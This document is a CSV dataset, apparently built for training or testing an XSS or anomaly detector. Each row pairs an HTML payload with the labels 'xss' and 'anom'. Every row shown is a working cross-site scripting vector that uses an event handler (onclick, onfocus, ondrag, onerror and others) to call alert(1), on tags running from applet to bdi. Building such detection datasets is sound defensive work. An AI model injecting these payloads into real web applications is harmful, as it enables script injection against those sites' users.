payload,attack_type,label
<applet id=x tabindex=1 onactivate=alert(1)></applet>,xss,anom
<applet id=x tabindex=1 onbeforeactivate=alert(1)></applet>,xss,anom
<applet id=x tabindex=1 onbeforedeactivate=alert(1)></applet><input autofocus>,xss,anom
<applet id=x tabindex=1 ondeactivate=alert(1)></applet><input id=y autofocus>,xss,anom
<applet id=x tabindex=1 onfocus=alert(1)></applet>,xss,anom
<applet id=x tabindex=1 onfocusin=alert(1)></applet>,xss,anom
"<applet onbeforecopy=""alert(1)"" contenteditable>test</applet>",xss,anom
"<applet onbeforecut=""alert(1)"" contenteditable>test</applet>",xss,anom
"<applet onbeforepaste=""alert(1)"" contenteditable>test</applet>",xss,anom
<applet onblur=alert(1) tabindex=1 id=x></applet><input autofocus>,xss,anom
"<applet onclick=""alert(1)"">test</applet>",xss,anom
"<applet oncontextmenu=""alert(1)"">test</applet>",xss,anom
"<applet oncopy=""alert(1)"" contenteditable>test</applet>",xss,anom
"<applet oncut=""alert(1)"" contenteditable>test</applet>",xss,anom
"<applet ondblclick=""alert(1)"">test</applet>",xss,anom
<applet onfocusout=alert(1) tabindex=1 id=x></applet><input autofocus>,xss,anom
"<applet onkeydown=""alert(1)"" contenteditable>test</applet>",xss,anom
"<applet onkeypress=""alert(1)"" contenteditable>test</applet>",xss,anom
"<applet onkeyup=""alert(1)"" contenteditable>test</applet>",xss,anom
"<applet onmousedown=""alert(1)"">test</applet>",xss,anom
"<applet onmouseenter=""alert(1)"">test</applet>",xss,anom
"<applet onmouseleave=""alert(1)"">test</applet>",xss,anom
"<applet onmousemove=""alert(1)"">test</applet>",xss,anom
"<applet onmouseout=""alert(1)"">test</applet>",xss,anom
"<applet onmouseover=""alert(1)"">test</applet>",xss,anom
"<applet onmouseup=""alert(1)"">test</applet>",xss,anom
"<applet onpaste=""alert(1)"" contenteditable>test</applet>",xss,anom
<applet onreadystatechange=alert(1)></applet>,xss,anom
"<area draggable=""true"" ondrag=""alert(1)"">test</area>",xss,anom
"<area draggable=""true"" ondragend=""alert(1)"">test</area>",xss,anom
"<area draggable=""true"" ondragenter=""alert(1)"">test</area>",xss,anom
"<area draggable=""true"" ondragleave=""alert(1)"">test</area>",xss,anom
"<area draggable=""true"" ondragstart=""alert(1)"">test</area>",xss,anom
<area id=x tabindex=1 onactivate=alert(1)></area>,xss,anom
<area id=x tabindex=1 onbeforeactivate=alert(1)></area>,xss,anom
<area id=x tabindex=1 onbeforedeactivate=alert(1)></area><input autofocus>,xss,anom
<area id=x tabindex=1 ondeactivate=alert(1)></area><input id=y autofocus>,xss,anom
"<area onbeforecopy=""alert(1)"" contenteditable>test</area>",xss,anom
"<area onbeforecut=""alert(1)"" contenteditable>test</area>",xss,anom
"<area onbeforepaste=""alert(1)"" contenteditable>test</area>",xss,anom
<area onblur=alert(1) tabindex=1 id=x></area><input autofocus>,xss,anom
"<area onclick=""alert(1)"">test</area>",xss,anom
"<area oncontextmenu=""alert(1)"">test</area>",xss,anom
"<area oncopy=""alert(1)"" contenteditable>test</area>",xss,anom
"<area oncut=""alert(1)"" contenteditable>test</area>",xss,anom
"<area ondblclick=""alert(1)"">test</area>",xss,anom
<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>,xss,anom
"<area onkeydown=""alert(1)"" contenteditable>test</area>",xss,anom
"<area onkeypress=""alert(1)"" contenteditable>test</area>",xss,anom
"<area onkeyup=""alert(1)"" contenteditable>test</area>",xss,anom
"<area onmousedown=""alert(1)"">test</area>",xss,anom
"<area onmouseenter=""alert(1)"">test</area>",xss,anom
"<area onmouseleave=""alert(1)"">test</area>",xss,anom
"<area onmousemove=""alert(1)"">test</area>",xss,anom
"<area onmouseout=""alert(1)"">test</area>",xss,anom
"<area onmouseover=""alert(1)"">test</area>",xss,anom
"<area onmouseup=""alert(1)"">test</area>",xss,anom
"<area onpaste=""alert(1)"" contenteditable>test</area>",xss,anom
"<article draggable=""true"" ondrag=""alert(1)"">test</article>",xss,anom
"<article draggable=""true"" ondragend=""alert(1)"">test</article>",xss,anom
"<article draggable=""true"" ondragenter=""alert(1)"">test</article>",xss,anom
"<article draggable=""true"" ondragleave=""alert(1)"">test</article>",xss,anom
"<article draggable=""true"" ondragstart=""alert(1)"">test</article>",xss,anom
<article id=x tabindex=1 onactivate=alert(1)></article>,xss,anom
<article id=x tabindex=1 onbeforeactivate=alert(1)></article>,xss,anom
<article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>,xss,anom
<article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>,xss,anom
<article id=x tabindex=1 onfocus=alert(1)></article>,xss,anom
<article id=x tabindex=1 onfocusin=alert(1)></article>,xss,anom
"<article onbeforecopy=""alert(1)"" contenteditable>test</article>",xss,anom
"<article onbeforecut=""alert(1)"" contenteditable>test</article>",xss,anom
"<article onbeforepaste=""alert(1)"" contenteditable>test</article>",xss,anom
<article onblur=alert(1) tabindex=1 id=x></article><input autofocus>,xss,anom
"<article onclick=""alert(1)"">test</article>",xss,anom
"<article oncontextmenu=""alert(1)"">test</article>",xss,anom
"<article oncopy=""alert(1)"" contenteditable>test</article>",xss,anom
"<article oncut=""alert(1)"" contenteditable>test</article>",xss,anom
"<article ondblclick=""alert(1)"">test</article>",xss,anom
<article onfocusout=alert(1) tabindex=1 id=x></article><input autofocus>,xss,anom
"<article onkeydown=""alert(1)"" contenteditable>test</article>",xss,anom
"<article onkeypress=""alert(1)"" contenteditable>test</article>",xss,anom
"<article onkeyup=""alert(1)"" contenteditable>test</article>",xss,anom
"<article onmousedown=""alert(1)"">test</article>",xss,anom
"<article onmouseenter=""alert(1)"">test</article>",xss,anom
"<article onmouseleave=""alert(1)"">test</article>",xss,anom
"<article onmousemove=""alert(1)"">test</article>",xss,anom
"<article onmouseout=""alert(1)"">test</article>",xss,anom
"<article onmouseover=""alert(1)"">test</article>",xss,anom
"<article onmouseup=""alert(1)"">test</article>",xss,anom
"<article onpaste=""alert(1)"" contenteditable>test</article>",xss,anom
"<aside draggable=""true"" ondrag=""alert(1)"">test</aside>",xss,anom
"<aside draggable=""true"" ondragend=""alert(1)"">test</aside>",xss,anom
"<aside draggable=""true"" ondragenter=""alert(1)"">test</aside>",xss,anom
"<aside draggable=""true"" ondragleave=""alert(1)"">test</aside>",xss,anom
"<aside draggable=""true"" ondragstart=""alert(1)"">test</aside>",xss,anom
<aside id=x tabindex=1 onactivate=alert(1)></aside>,xss,anom
<aside id=x tabindex=1 onbeforeactivate=alert(1)></aside>,xss,anom
<aside id=x tabindex=1 onbeforedeactivate=alert(1)></aside><input autofocus>,xss,anom
<aside id=x tabindex=1 ondeactivate=alert(1)></aside><input id=y autofocus>,xss,anom
<aside id=x tabindex=1 onfocus=alert(1)></aside>,xss,anom
<aside id=x tabindex=1 onfocusin=alert(1)></aside>,xss,anom
"<aside onbeforecopy=""alert(1)"" contenteditable>test</aside>",xss,anom
"<aside onbeforecut=""alert(1)"" contenteditable>test</aside>",xss,anom
"<aside onbeforepaste=""alert(1)"" contenteditable>test</aside>",xss,anom
<aside onblur=alert(1) tabindex=1 id=x></aside><input autofocus>,xss,anom
"<aside onclick=""alert(1)"">test</aside>",xss,anom
"<aside oncontextmenu=""alert(1)"">test</aside>",xss,anom
"<aside oncopy=""alert(1)"" contenteditable>test</aside>",xss,anom
"<aside oncut=""alert(1)"" contenteditable>test</aside>",xss,anom
"<aside ondblclick=""alert(1)"">test</aside>",xss,anom
<aside onfocusout=alert(1) tabindex=1 id=x></aside><input autofocus>,xss,anom
"<aside onkeydown=""alert(1)"" contenteditable>test</aside>",xss,anom
"<aside onkeypress=""alert(1)"" contenteditable>test</aside>",xss,anom
"<aside onkeyup=""alert(1)"" contenteditable>test</aside>",xss,anom
"<aside onmousedown=""alert(1)"">test</aside>",xss,anom
"<aside onmouseenter=""alert(1)"">test</aside>",xss,anom
"<aside onmouseleave=""alert(1)"">test</aside>",xss,anom
"<aside onmousemove=""alert(1)"">test</aside>",xss,anom
"<aside onmouseout=""alert(1)"">test</aside>",xss,anom
"<aside onmouseover=""alert(1)"">test</aside>",xss,anom
"<aside onmouseup=""alert(1)"">test</aside>",xss,anom
"<aside onpaste=""alert(1)"" contenteditable>test</aside>",xss,anom
"<audio autoplay controls onpause=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",xss,anom
"<audio autoplay controls onseeked=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",xss,anom
"<audio autoplay controls onseeking=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",xss,anom
"<audio autoplay controls onvolumechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",xss,anom
"<audio autoplay onloadedmetadata=alert(1)> <source src=""validaudio.wav"" type=""audio/wav""></audio>",xss,anom
"<audio autoplay onplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",xss,anom
"<audio autoplay onplaying=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",xss,anom
"<audio controls autoplay onended=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",xss,anom
"<audio controls autoplay ontimeupdate=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",xss,anom
"<audio draggable=""true"" ondrag=""alert(1)"">test</audio>",xss,anom
"<audio draggable=""true"" ondragend=""alert(1)"">test</audio>",xss,anom
"<audio draggable=""true"" ondragenter=""alert(1)"">test</audio>",xss,anom
"<audio draggable=""true"" ondragleave=""alert(1)"">test</audio>",xss,anom
"<audio draggable=""true"" ondragstart=""alert(1)"">test</audio>",xss,anom
"<audio id=x controls onfocus=alert(1) id=x><source src=""validaudio.wav""></audio>",xss,anom
"<audio id=x controls onfocusin=alert(1) id=x><source src=""validaudio.wav""></audio>",xss,anom
<audio id=x tabindex=1 onactivate=alert(1)></audio>,xss,anom
<audio id=x tabindex=1 onbeforeactivate=alert(1)></audio>,xss,anom
<audio id=x tabindex=1 onbeforedeactivate=alert(1)></audio><input autofocus>,xss,anom
<audio id=x tabindex=1 ondeactivate=alert(1)></audio><input id=y autofocus>,xss,anom
"<audio onbeforecopy=""alert(1)"" contenteditable>test</audio>",xss,anom
"<audio onbeforecut=""alert(1)"" contenteditable>test</audio>",xss,anom
"<audio onbeforepaste=""alert(1)"" contenteditable>test</audio>",xss,anom
<audio onblur=alert(1) tabindex=1 id=x></audio><input autofocus>,xss,anom
"<audio oncanplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",xss,anom
"<audio onclick=""alert(1)"">test</audio>",xss,anom
"<audio oncontextmenu=""alert(1)"">test</audio>",xss,anom
"<audio oncopy=""alert(1)"" contenteditable>test</audio>",xss,anom
"<audio oncut=""alert(1)"" contenteditable>test</audio>",xss,anom
"<audio ondblclick=""alert(1)"">test</audio>",xss,anom
<audio onfocusout=alert(1) tabindex=1 id=x></audio><input autofocus>,xss,anom
"<audio onkeydown=""alert(1)"" contenteditable>test</audio>",xss,anom
"<audio onkeypress=""alert(1)"" contenteditable>test</audio>",xss,anom
"<audio onkeyup=""alert(1)"" contenteditable>test</audio>",xss,anom
"<audio onloadeddata=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",xss,anom
"<audio onmousedown=""alert(1)"">test</audio>",xss,anom
"<audio onmouseenter=""alert(1)"">test</audio>",xss,anom
"<audio onmouseleave=""alert(1)"">test</audio>",xss,anom
"<audio onmousemove=""alert(1)"">test</audio>",xss,anom
"<audio onmouseout=""alert(1)"">test</audio>",xss,anom
"<audio onmouseover=""alert(1)"">test</audio>",xss,anom
"<audio onmouseup=""alert(1)"">test</audio>",xss,anom
"<audio onpaste=""alert(1)"" contenteditable>test</audio>",xss,anom
<audio src/onerror=alert(1)>,xss,anom
"<b draggable=""true"" ondrag=""alert(1)"">test</b>",xss,anom
"<b draggable=""true"" ondragend=""alert(1)"">test</b>",xss,anom
"<b draggable=""true"" ondragenter=""alert(1)"">test</b>",xss,anom
"<b draggable=""true"" ondragleave=""alert(1)"">test</b>",xss,anom
"<b draggable=""true"" ondragstart=""alert(1)"">test</b>",xss,anom
<b id=x tabindex=1 onactivate=alert(1)></b>,xss,anom
<b id=x tabindex=1 onbeforeactivate=alert(1)></b>,xss,anom
<b id=x tabindex=1 onbeforedeactivate=alert(1)></b><input autofocus>,xss,anom
<b id=x tabindex=1 ondeactivate=alert(1)></b><input id=y autofocus>,xss,anom
<b id=x tabindex=1 onfocus=alert(1)></b>,xss,anom
<b id=x tabindex=1 onfocusin=alert(1)></b>,xss,anom
"<b onbeforecopy=""alert(1)"" contenteditable>test</b>",xss,anom
"<b onbeforecut=""alert(1)"" contenteditable>test</b>",xss,anom
"<b onbeforepaste=""alert(1)"" contenteditable>test</b>",xss,anom
<b onblur=alert(1) tabindex=1 id=x></b><input autofocus>,xss,anom
"<b onclick=""alert(1)"">test</b>",xss,anom
"<b oncontextmenu=""alert(1)"">test</b>",xss,anom
"<b oncopy=""alert(1)"" contenteditable>test</b>",xss,anom
"<b oncut=""alert(1)"" contenteditable>test</b>",xss,anom
"<b ondblclick=""alert(1)"">test</b>",xss,anom
<b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>,xss,anom
"<b onkeydown=""alert(1)"" contenteditable>test</b>",xss,anom
"<b onkeypress=""alert(1)"" contenteditable>test</b>",xss,anom
"<b onkeyup=""alert(1)"" contenteditable>test</b>",xss,anom
"<b onmousedown=""alert(1)"">test</b>",xss,anom
"<b onmouseenter=""alert(1)"">test</b>",xss,anom
"<b onmouseleave=""alert(1)"">test</b>",xss,anom
"<b onmousemove=""alert(1)"">test</b>",xss,anom
"<b onmouseout=""alert(1)"">test</b>",xss,anom
"<b onmouseover=""alert(1)"">test</b>",xss,anom
"<b onmouseup=""alert(1)"">test</b>",xss,anom
"<b onpaste=""alert(1)"" contenteditable>test</b>",xss,anom
"<base draggable=""true"" ondrag=""alert(1)"">test</base>",xss,anom
"<base draggable=""true"" ondragend=""alert(1)"">test</base>",xss,anom
"<base draggable=""true"" ondragenter=""alert(1)"">test</base>",xss,anom
"<base draggable=""true"" ondragleave=""alert(1)"">test</base>",xss,anom
"<base draggable=""true"" ondragstart=""alert(1)"">test</base>",xss,anom
<base id=x tabindex=1 onactivate=alert(1)></base>,xss,anom
<base id=x tabindex=1 onbeforeactivate=alert(1)></base>,xss,anom
<base id=x tabindex=1 onbeforedeactivate=alert(1)></base><input autofocus>,xss,anom
<base id=x tabindex=1 ondeactivate=alert(1)></base><input id=y autofocus>,xss,anom
<base id=x tabindex=1 onfocus=alert(1)></base>,xss,anom
<base id=x tabindex=1 onfocusin=alert(1)></base>,xss,anom
"<base onbeforecopy=""alert(1)"" contenteditable>test</base>",xss,anom
"<base onbeforecut=""alert(1)"" contenteditable>test</base>",xss,anom
"<base onbeforepaste=""alert(1)"" contenteditable>test</base>",xss,anom
<base onblur=alert(1) tabindex=1 id=x></base><input autofocus>,xss,anom
"<base onclick=""alert(1)"">test</base>",xss,anom
"<base oncontextmenu=""alert(1)"">test</base>",xss,anom
"<base oncopy=""alert(1)"" contenteditable>test</base>",xss,anom
"<base oncut=""alert(1)"" contenteditable>test</base>",xss,anom
"<base ondblclick=""alert(1)"">test</base>",xss,anom
<base onfocusout=alert(1) tabindex=1 id=x></base><input autofocus>,xss,anom
"<base onkeydown=""alert(1)"" contenteditable>test</base>",xss,anom
"<base onkeypress=""alert(1)"" contenteditable>test</base>",xss,anom
"<base onkeyup=""alert(1)"" contenteditable>test</base>",xss,anom
"<base onmousedown=""alert(1)"">test</base>",xss,anom
"<base onmouseenter=""alert(1)"">test</base>",xss,anom
"<base onmouseleave=""alert(1)"">test</base>",xss,anom
"<base onmousemove=""alert(1)"">test</base>",xss,anom
"<base onmouseout=""alert(1)"">test</base>",xss,anom
"<base onmouseover=""alert(1)"">test</base>",xss,anom
"<base onmouseup=""alert(1)"">test</base>",xss,anom
"<base onpaste=""alert(1)"" contenteditable>test</base>",xss,anom
"<basefont draggable=""true"" ondrag=""alert(1)"">test</basefont>",xss,anom
"<basefont draggable=""true"" ondragend=""alert(1)"">test</basefont>",xss,anom
"<basefont draggable=""true"" ondragenter=""alert(1)"">test</basefont>",xss,anom
"<basefont draggable=""true"" ondragleave=""alert(1)"">test</basefont>",xss,anom
"<basefont draggable=""true"" ondragstart=""alert(1)"">test</basefont>",xss,anom
<basefont id=x tabindex=1 onactivate=alert(1)></basefont>,xss,anom
<basefont id=x tabindex=1 onbeforeactivate=alert(1)></basefont>,xss,anom
<basefont id=x tabindex=1 onbeforedeactivate=alert(1)></basefont><input autofocus>,xss,anom
<basefont id=x tabindex=1 ondeactivate=alert(1)></basefont><input id=y autofocus>,xss,anom
<basefont id=x tabindex=1 onfocus=alert(1)></basefont>,xss,anom
<basefont id=x tabindex=1 onfocusin=alert(1)></basefont>,xss,anom
"<basefont onbeforecopy=""alert(1)"" contenteditable>test</basefont>",xss,anom
"<basefont onbeforecut=""alert(1)"" contenteditable>test</basefont>",xss,anom
"<basefont onbeforepaste=""alert(1)"" contenteditable>test</basefont>",xss,anom
<basefont onblur=alert(1) tabindex=1 id=x></basefont><input autofocus>,xss,anom
"<basefont onclick=""alert(1)"">test</basefont>",xss,anom
"<basefont oncontextmenu=""alert(1)"">test</basefont>",xss,anom
"<basefont oncopy=""alert(1)"" contenteditable>test</basefont>",xss,anom
"<basefont oncut=""alert(1)"" contenteditable>test</basefont>",xss,anom
"<basefont ondblclick=""alert(1)"">test</basefont>",xss,anom
<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>,xss,anom
"<basefont onkeydown=""alert(1)"" contenteditable>test</basefont>",xss,anom
"<basefont onkeypress=""alert(1)"" contenteditable>test</basefont>",xss,anom
"<basefont onkeyup=""alert(1)"" contenteditable>test</basefont>",xss,anom
"<basefont onmousedown=""alert(1)"">test</basefont>",xss,anom
"<basefont onmouseenter=""alert(1)"">test</basefont>",xss,anom
"<basefont onmouseleave=""alert(1)"">test</basefont>",xss,anom
"<basefont onmousemove=""alert(1)"">test</basefont>",xss,anom
"<basefont onmouseout=""alert(1)"">test</basefont>",xss,anom
"<basefont onmouseover=""alert(1)"">test</basefont>",xss,anom
"<basefont onmouseup=""alert(1)"">test</basefont>",xss,anom
"<basefont onpaste=""alert(1)"" contenteditable>test</basefont>",xss,anom
"<bdi draggable=""true"" ondrag=""alert(1)"">test</bdi>",xss,anom
"<bdi draggable=""true"" ondragend=""alert(1)"">test</bdi>",xss,anom
"<bdi draggable=""true"" ondragenter=""alert(1)"">test</bdi>",xss,anom
